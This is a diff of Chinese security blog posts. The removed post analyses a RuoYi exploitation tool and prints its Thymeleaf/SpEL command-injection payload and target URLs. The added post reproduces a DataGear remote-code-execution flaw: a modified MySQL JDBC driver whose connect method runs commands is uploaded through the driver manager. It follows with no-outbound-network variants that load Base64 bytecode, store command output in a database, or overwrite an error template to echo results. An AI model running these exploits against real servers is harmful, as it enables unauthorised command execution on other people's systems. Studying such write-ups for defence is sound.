@@ -1,380 +1,300 @@
-# 若依一把梭哈工具源码解析
+# datagear 最新 rce 漏洞
 
 ## 前言
 
-最近在研究如何开发一个工具，所以得开始分析前人开发的好工具了，不仅可以涨涨我的开发知识，还可以学习学习这个框架的漏洞
+这个漏洞的思路可以说很顶级了，简直无敌，主要是通过传入 jar 替换数据库驱动，但是 jar 又是我们修改过的 jar，然后导致执行里面的一些方法，导致了 rce
 
+## datagear
 
-## 可视化界面
+为什么会出现这个漏洞就不得不提到我们的 datagear 是干嘛的了
 
-首先我们先简单看看它的可视化界面，我们需要注意的是要大概分析逻辑和模块的分类，整体的框架需要了解
+官方文档 [http://www.datagear.tech/documentation/#installation](http://www.datagear.tech/documentation/#installation)
 
+DataGear 是一款开源免费的数据可视化分析平台，自由制作任何您想要的数据看板，支持接入 SQL、CSV、Excel、HTTP 接口、JSON 等多种数据源。 系统主要功能包括：数据源管理、SQL 工作台、数据导入/导出、项目管理、数据集管理、图表管理、看板管理、用户管理、角色管理、数据源驱动管理、图表插件管理等。
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206203716.png)
+系统特点：
 
-我们可以大概给他做一个划分，首先是基础的配置模块，也就是 url 地址和 cookie，因为 ruoyi 基本上都是后台的漏洞
+安全稳定 六年持续开发迭代，累计发布 50+版本，稳定运行数千小时无异常，功能流畅不卡顿 私有化部署，单体应用，轻量架构，安装简单，运行环境和数据全掌控 基于角色的权限控制策略，数据默认私有，可分享共用，保护数据安全 越权访问校验、SQL 防注入、数据源防护、敏感信息加密存储、日志脱敏处理 功能丰富 数据源管理支持数据增删改查、导入导出、SQL 工作台 数据集支持 SQL/HTTP/CSV/Excel/JSON/文件，支持定义参数和参数化语法 图表支持在一个内绑定多个不同来源的数据集，内置 70+开箱即用的常用图表 数据看板支持导入 HTML 模板、可视/源码编辑模式、分享密码、iframe 嵌入 用户管理、角色管理、数据源驱动管理、图表插件管理等功能 易于扩展 支持运行时添加数据源驱动，接入任何提供 JDBC 驱动库的数据库，包括但不限于 MySQL、PostgreSQL、Oracle、SQL Server、Elasticsearch、ClickHouse，以及 OceanBase、TiDB、人大金仓、达梦等众多国产数据库 支持编写和上传自定义图表插件，扩展系统图表类型，也支持重写和扩展内置图表插件、自定义图表选项，个性化图表展示效果 自由制作 数据看板采用原生的 HTML 网页作为模板，支持导入任意 HTML/JavaScript/CSS，支持可视化设计，同时支持自由编辑源码 支持引入 Vue、React、Bootstrap、Tailwind CSS 等 web 前端框架，制作具有丰富交互效果、多端适配的数据看板 内置丰富的数据看板 API，可制作图表联动、数据钻取、异步加载、交互表单等个性化数据看板
 
-然后就是漏洞利用的分类了，可以看见这个工具是比较全的，基本上 ruoyi 的历史漏洞都有
+## 漏洞复现
 
-然后第三个模块就是具体的利用和参数的配置了
-比如其中的 sql 注入
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206203956.png)
+首先搭建一个环境 只需要去下载官方的文件，然后在 idea 导入就 ok
 
-然后对于整体的分析，我们还需要看看目录
+登录 admin 后 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011406.png)
 
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206204051.png)
-主要关注 ruoyi，其他的只是依赖
+原来有的数据库驱动
 
-可以看到和我们看到的 gui 界面其实大差不差的
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011528.png) 我们还可以自己上传
 
-## 源码分析
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209011548.png) 这里我们就上传自己构造的恶意 jar
 
-### config
+我下了一个 mysql-connector-java-8.0.28.jar
 
-基础配置部分
+修改其中的 com.mysql.cj.jdbc.NonRegisteringDriver 文件
 
-```java
-//
-// Source code recreated from a .class file by IntelliJ IDEA
-// (powered by FernFlower decompiler)
-//
+修改它的 connect 方法
 
-package com.ruoyi.config;
-
-import com.ruoyi.util.RequestUtil;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import javafx.scene.control.TextArea;
-
-public class Config {
-    public static String url;
-    public static String cookie;
-    public static Boolean isConnected = false;
-    public static String snakeyamlUrl = "";
-    public static TextArea resultText;
-    public static String jobId;
-    public static List<String> vulMode = new ArrayList();
-    public static String uploadPath = "";
-    public static File jarFile = null;
-    public static final String jobListPath = "/monitor/job/list";
-    public static final String jobAddPath = "/monitor/job/add";
-    public static final String jobEditPath = "/monitor/job/edit";
-    public static final String jobRunPath = "/monitor/job/run";
-    public static final String jobLogListPath = "/monitor/jobLog/list";
-    public static final String jobLogCleanPath = "/monitor/jobLog/clean";
-    public static final String uploadUrlPath = "/common/upload";
-
-    public Config() {
-    }
-
-    public static String get(String path) {
-        return RequestUtil.get(url + path, cookie);
-    }
-
-    public static String post(String path, String param) {
-        return RequestUtil.post(url + path, param, cookie);
-    }
-
-    public static String postConfig(String path, String param) {
-        return RequestUtil.postConfig(url + path, param, cookie);
-    }
-
-    public static String post2(String path, String param) throws IOException {
-        return RequestUtil.post2(url + path, param, cookie);
-    }
-
-    public static String postheader(String param, String rememberMe) throws Exception {
-        return RequestUtil.shiroPost(url, param, rememberMe);
-    }
-
-    public static String upload(String path, String filename, File file) {
-        try {
-            HashMap<String, InputStream> hashMap = new HashMap();
-            hashMap.put(filename, new FileInputStream(file));
-            return RequestUtil.upload(url + path, hashMap, cookie);
-        } catch (Exception var4) {
-            return "";
-        }
-    }
+public Connection connect(String url, Properties info) throws SQLException {  
+    try {  
+        Runtime.getRuntime().exec("calc");  
+    } catch (CJException | IOException var7) {  
+        throw SQLExceptionsMapping.translateException(var7);  
+    }  
+    return null;  
 }
 
-```
+然后我们上传 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012316.png) 成功上传 然后我们导入一个数据库，然后利用这个驱动
 
-可以看到 config 中有许多的初始化数据，然后有各种请求，马上结合主类来分析这个会比较好，其实简单来讲，我们定义 config 其实作用更像是全局变量
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012357.png)
 
-### MainController
+再次点击数据库 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209012424.png)
 
-熟悉 javafx 的，都清楚我们的调用逻辑几乎都是在这个文件中写好的，我们主要分析这个
+弹出计算器，因为连接过程中调用了 connect 方法
 
-我们看看它的结构有个大概的了解
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206205227.png)
-可以看到就是漏洞利用的一些方法，具体的利用会调用 exp 中的 poc
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206205302.png)
+反弹一手 shell 试试 重新构造方法
 
-#### 确定功能
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209013055.png) 然后一样的步骤
 
-对应到我们的 gui 界面，我们输入好数据后点击确定，其设置的值是 configBtn
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206205948.png)
-我们去代码里面找找
+起个端口监听 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209013129.png)
 
-```java
-this.configBtn.setOnAction((event) -> {
-    this.config();
-});
-```
+## 不出网利用
 
-可以看到设置为了点击事件，点击后会触发 this.config();方法
+### 自定义 class 探索
 
-```java
-public void config() {
-    this.configConn = false;
-    ResultUtil.clear();
-    Config.url = this.urlText.getText();
-    Config.cookie = this.cookieText.getText();
-    if (!Config.url.isEmpty() && !Config.cookie.isEmpty()) {
-        String resp = RequestUtil.get(Config.url, Config.cookie);
-        Pattern pattern = Pattern.compile("<p>(.*?)</p>");
-        Matcher matcher = pattern.matcher(resp);
-        if (matcher.find()) {
-            List<String> jobList = JobUtil.getList();
-            if (jobList.isEmpty()) {
-                JobUtil.createJob();
-                jobList = JobUtil.getList();
-                this.configConn = true;
-            }
+然后探索了一波不出网该怎么利用，这里记录一下过程吧
 
-            Config.jobId = (String)jobList.get(0);
-            ResultUtil.success("配置信息成功,Cookie有效");
-            this.configConn = true;
-        } else {
-            ResultUtil.success("配置信息成功,Cookie无效");
-        }
-    } else {
-        ResultUtil.success("配置信息失败");
-    }
+首先第一就是打内存马，但是有个问题在于我不能使用非 jar 包的类
 
+开始拷打 gpt
+
+import java.io.\*;  
+import java.lang.reflect.Method;  
+​  
+public class MyDatabaseConnection {  
+    public String connect(String url, Properties info) throws SQLException {  
+        StringBuilder output \= new StringBuilder();  
+        try {  
+            // 获取类字节码文件的路径  
+            String classPath \= info.getProperty("classPath");  // 假设 classPath 是传递的类字节码文件的路径  
+​  
+            // 读取字节码文件  
+            FileInputStream classFile \= new FileInputStream(classPath);  
+            byte\[\] classBytes \= classFile.readAllBytes();  
+            classFile.close();  
+​  
+            // 创建自定义 ClassLoader  
+            MyClassLoader classLoader \= new MyClassLoader();  
+            // 加载字节码到内存  
+            Class<?> loadedClass \= classLoader.defineClass("MyClass", classBytes);  
+​  
+            // 创建加载的类的实例  
+            Object instance \= loadedClass.getDeclaredConstructor().newInstance();  
+​  
+            // 假设目标类有一个名为 \`run\` 的方法  
+            Method runMethod \= loadedClass.getMethod("run");  
+            Object result \= runMethod.invoke(instance);  
+​  
+            // 获取方法的输出并返回  
+            output.append(result.toString());  
+        } catch (Exception e) {  
+            throw new SQLException("Error loading class or executing method", e);  
+        }  
+​  
+        return output.toString();  
+    }  
+      
+    // 自定义 ClassLoader 用于加载类字节码  
+    public class MyClassLoader extends ClassLoader {  
+        public Class<?> defineClass(String className, byte\[\] classData) {  
+            return defineClass(className, classData, 0, classData.length);  
+        }  
+    }  
+}  
+​
+
+看起来好像没有问题，但是我们只能修改一个方法，也不能修改类啊，这个是需要自己定义的 MyClassLoader
+
+然后尝试有没有不需要的
+
+import java.sql.Connection;  
+import java.sql.SQLException;  
+import java.util.Base64;  
+import java.lang.reflect.Method;  
+​  
+public Connection connect(String url, Properties info) throws SQLException {  
+    try {  
+        // 获取 Base64 编码的字节码字符串  
+        String base64EncodedClass \= info.getProperty("base64Class");  // 假设通过 "base64Class" 属性传递 Base64 字符串  
+​  
+        // 解码 Base64 字符串为字节数组  
+        byte\[\] classBytes \= Base64.getDecoder().decode(base64EncodedClass);  
+​  
+        // 使用 ClassLoader 加载字节码  
+        ClassLoader classLoader \= this.getClass().getClassLoader();  
+        Class<?> loadedClass \= (Class<?>) Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", String.class, byte\[\].class, int.class, int.class)  
+            .setAccessible(true).invoke(classLoader, null, classBytes, 0, classBytes.length);  
+​  
+        // 创建类的实例  
+        Object instance \= loadedClass.getDeclaredConstructor().newInstance();  
+​  
+        // 假设目标类有一个名为 "run" 的方法  
+        Method runMethod \= loadedClass.getMethod("run");  
+        Object result \= runMethod.invoke(instance);  
+​  
+        // 如果目标方法有返回值，可以处理它  
+        System.out.println(result);  
+​  
+        return null; // 或返回一个连接对象  
+    } catch (Exception e) {  
+        throw new SQLException("Error loading class or executing method", e);  
+    }  
+}  
+​
+
+这个可以看到没有自定义类了，但是问题在于我放到里面会报错
+
+那个 invoke 那里一直报错，没有找到解决办法，就尝试其他的办法了
+
+最后也是无果
+
+然后想到了一个歪门邪道的办法，就是如何才能在 jar 包定义一个类
+
+我想的是直接修改一个类，但是类和类之间是有关联性的
+
+于是找了一会发现一个类
+
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014226.png) 这个类
+
+//  
+// Source code recreated from a .class file by IntelliJ IDEA  
+// (powered by FernFlower decompiler)  
+//  
+​  
+package com.mysql.jdbc;  
+​  
+import java.sql.SQLException;  
+​  
+public class Driver extends com.mysql.cj.jdbc.Driver {  
+    public Driver() throws SQLException {  
+    }  
+​  
+    static {  
+        System.err.println("Loading class \`com.mysql.jdbc.Driver'. This is deprecated. The new driver class is \`com.mysql.cj.jdbc.Driver'. The driver is automatically registered via the SPI and manual loading of the driver class is generally unnecessary.");  
+    }  
+}  
+​
+
+就是一个简单的提示，没有其他的任何作用
+
+然后我就把它改成了我们需要自定义的类，但是类名我没有办法改
+
+我先随便尝试一下能不能调用自定义类的方法 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014500.png) 改成了这个样子
+
+然后可惜的是 我们的目标类![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014529.png)
+
+我不能引入两个名字一样的文件
+
+这样会报错
+
+### 执行命令把结果写入数据库中
+
+然后我又思考了一个逆天的办法
+
+开始尝试一下
+
+import java.sql.Connection;  
+import java.sql.DriverManager;  
+import java.sql.PreparedStatement;  
+import java.sql.SQLException;  
+import java.io.BufferedReader;  
+import java.io.InputStreamReader;  
+import java.util.Properties;  
+​  
+public class CustomConnection {  
+​  
+    public Connection connect(String url, Properties info) throws SQLException {  
+        try {  
+            // 执行外部命令（例如：cat flag）  
+            Process process \= Runtime.getRuntime().exec("calc");  
+​  
+            // 获取命令输出流  
+            BufferedReader reader \= new BufferedReader(new InputStreamReader(process.getInputStream()));  
+            StringBuilder commandResult \= new StringBuilder();  
+            String line;  
+​  
+            // 读取命令输出并拼接结果  
+            while ((line \= reader.readLine()) != null) {  
+                commandResult.append(line).append("\\n");  
+            }  
+​  
+            // 确保命令执行完成  
+            process.waitFor();  
+​  
+            // 获取数据库连接  
+            Connection dbConnection \= DriverManager.getConnection(url, info);  
+​  
+            // SQL 插入语句  
+            String sql \= "INSERT INTO exp (content) VALUES (?)";  
+            PreparedStatement stmt \= dbConnection.prepareStatement(sql);  
+​  
+            // 插入命令的输出结果到 content 字段  
+            stmt.setString(1, commandResult.toString());  
+            stmt.executeUpdate();  
+​  
+            stmt.close();  
+            dbConnection.close();  
+​  
+            return null; // 返回 null 按照原方法要求  
+​  
+        } catch (Exception var4) {  
+            throw SQLExceptionsMapping.translateException(var4); // 使用提供的异常映射  
+        }  
+    }  
+}  
+​
+
+然后一样的方法去尝试
+
+发现结果是一直调用 connect 方法 导致我的电脑一直弹计算器
+
+然后根本停不下来，大家不要随便尝试
+
+然后我再去查看我的数据库的时候 ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209014915.png) 伤心了老弟 什么结果都没有 但是我还是不服气
+
+### 覆盖模板文件外带
+
+我想了半天，到底应该怎么办，必须有回显，那我能不能覆盖模板呢?
+
+尝试一手
+
+public Connection connect(String url, Properties info) throws SQLException {  
+    try {  
+        Process process \= Runtime.getRuntime().exec("whoami");  
+        BufferedReader reader \= new BufferedReader(new InputStreamReader(process.getInputStream()));  
+        StringBuilder commandResult \= new StringBuilder();  
+​  
+        String line;  
+        while((line \= reader.readLine()) != null) {  
+            commandResult.append(line).append("\\n");  
+        }  
+​  
+        process.waitFor();  
+        String filePath \= "F:\\\\IntelliJ IDEA 2023.3.2\\\\javascript\\\\cms\\\\datagear-4.5.0\\\\datagear-web\\\\src\\\\main\\\\resources\\\\org\\\\datagear\\\\web\\\\templates\\\\error.ftl";  
+        Files.write(Paths.get(filePath), commandResult.toString().getBytes(), new OpenOption\[\]{StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE\_EXISTING});  
+        System.out.println("Command output has been written to: " + filePath);  
+    } catch (InterruptedException | IOException var8) {  
+        var8.printStackTrace();  
+    }  
+​  
+    return null;  
 }
-```
 
-可以看到把我们输入的 url 和 cookie 获取，然后传给了 RequestUtil.get(Config.url, Config.cookie)
-这个也是我们的公用类
+我把命令执行结果直接外带到模板文件
 
-```java
-public static String get(String url, String cookie) {
-    new Proxy(Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
-    String result = "";
-    BufferedReader in = null;
+尝试一手
 
-    try {
-        URL realUrl = new URL(url);
-        URLConnection conn = realUrl.openConnection();
-        conn.setReadTimeout(5000);
-        conn.setRequestProperty("accept", "*/*");
-        conn.setRequestProperty("connection", "Keep-Alive");
-        conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
-        conn.setRequestProperty("Cookie", cookie);
-        conn.connect();
+先随便取名字
 
-        String line;
-        for(in = new BufferedReader(new InputStreamReader(conn.getInputStream())); (line = in.readLine()) != null; result = result + line + "\n") {
-        }
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015227.png) 访问不存在页面报错
 
-        String var9 = result;
-        return var9;
-    } catch (Exception var19) {
-        ResultUtil.fail("连接异常没有检测到若依框架,请检查url地址是否正确");
-        var19.printStackTrace();
-    } finally {
-        try {
-            if (in != null) {
-                in.close();
-            }
-        } catch (Exception var18) {
-            var18.printStackTrace();
-        }
-
-    }
-
-    return null;
-}
-```
-
-发送一个请求，然后获取响应内容，至于我们判断是否有效，是根据有没有 p 标签来判断的
-
-#### 漏洞扫描功能
-
-对应的是 submitBtn
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206210800.png)
-如果没有工具也可以功能 fxml 文件
-
-```java
-<Button fx:id="submitBtn" mnemonicParsing="false" prefWidth="80.0" text="扫描">
-
-    <HBox.margin>
-        <Insets left="20.0" />
-    </HBox.margin>
-</Button>
-``
-
-然后寻找相关的代码
-
-```java
-this.submitBtn.setOnAction((event) -> {
-    this.conn();
-});
-```
-
-进入 conn 方法
-
-```java
-public void conn() {
-    ResultUtil.clear();
-    Runnable runnable = () -> {
-        this.vulText.appendText("正在扫描全部漏洞，请耐心等待~\r\n");
-        if (this.configConn) {
-            VulScan.scan();
-        } else {
-            ResultUtil.fail("网络异常或Cookie无效,只进行Shiro框架识别与key探测");
-            VulScan.ShiroTest();
-        }
-
-    };
-    Thread workThrad = new Thread(runnable);
-    workThrad.start();
-}
-```
-
-可以看到扫描的前提是 configConn 为真，也就是我们前面的配置成功的部分
-scan 的话就是对全部的 poc 都测试一遍
-
-```java
-public static void scan() {
-    yamlTest();
-    jdbcTest();
-    readTest();
-    ThymeleafTest();
-    sql2Test();
-    ShiroTest();
-}
-```
-
-看到 else 部分的话是只对 shiro 进行测试
-
-#### 具体漏洞测试
-
-这里就随便拿一个漏洞了，就用 thymeleaf 利用
-
-一样的逻辑，定位 thymeleafTab
-
-```java
-this.thymeleafTab.setOnSelectionChanged((event) -> {
-    this.changeResultText(this.thymeleafTab, this.thymeleafText);
-});
-```
-
-跟了半天发现这就是一个简单的改变回显结果
-然后再次看了一下界面，发现事件的触发点是
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206213833.png)
-thymeleafBtn
-
-```java
-this.thymeleafBtn.setOnAction((event) -> {
-    this.thymeleafExp();
-});
-```
-
-果不其然调用到了 thymeleafExp
-
-```java
-public void thymeleafExp() {
-    ResultUtil.clear();
-    String cmd = this.thymeleafUrlText.getText();
-    boolean bo = ThymeleafExp.check(cmd);
-    if (!bo) {
-        ResultUtil.fail("命令执行失败");
-    } else {
-        ResultUtil.success("命令执行成功，无回显自行检查。");
-    }
-
-}
-```
-
-具体的执行逻辑是在 check 方法
-
-```java
-public static boolean check(String cmd) {
-    String payload = "(${T (java.lang.Runtime).getRuntime().exec(\"" + cmd + "\")})";
-    String encodedPayload = "";
-    char[] var3 = payload.toCharArray();
-    int var4 = var3.length;
-
-    for(int var5 = 0; var5 < var4; ++var5) {
-        char c = var3[var5];
-        encodedPayload = encodedPayload + "%" + Integer.toHexString(c);
-    }
-
-    String url1 = "/monitor/cache/getNames?fragment=header(" + encodedPayload + ")";
-    String url2 = "/monitor/cache/getKeys?fragment=header(" + encodedPayload + ")";
-    String url3 = "/monitor/cache/getValue?fragment=header(" + encodedPayload + ")";
-    String url4 = "/demo/form/localrefresh/task?fragment=header(" + encodedPayload + ")";
-
-    String post3;
-    try {
-        post3 = Config.post(url1, "");
-        if (post3.contains("getNames")) {
-            return true;
-        }
-    } catch (Exception var11) {
-    }
-
-    try {
-        post3 = Config.post(url2, "");
-        if (post3.contains("getKeys")) {
-            return true;
-        }
-    } catch (Exception var10) {
-    }
-
-    try {
-        post3 = Config.post(url3, "");
-        if (post3.contains("getValue")) {
-            return true;
-        }
-    } catch (Exception var9) {
-    }
-
-    try {
-        post3 = Config.post(url4, "");
-        if (post3.contains("task")) {
-            return true;
-        }
-    } catch (Exception var8) {
-    }
-
-    return false;
-}
-```
-
-可以看到先把我们传入的 cmd 生成 spel 表达式，然后把每一个存在的模板注入的地址都测试我们的 paylaod
-
-### 工具类
-
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206215145.png)
-
-工具类一般它的方法都是比较通用的，比如这个类需要使用，那个类也需要使用，根据这些名称我们就能看出这里的工具类一般都是编码，发送请求，处理结果
-
-比如我们请求类
-各种请求
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206220530.png)
-
-然后加密类
-![](https://gitee.com/nn0nkey/picture/raw/master/img/20241206221509.png)
-
-就是对应的加密和解密的方法
-
-参考---这个工具是以前下的，在网上找半天的链接都没有找到，找到会补上链接
+![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015251.png) 然后尝试上传 jar ![](https://gitee.com/nn0nkey/picture/raw/master/img/20241209015323.png) 回显成功外带了 我是等了一会回显才有的
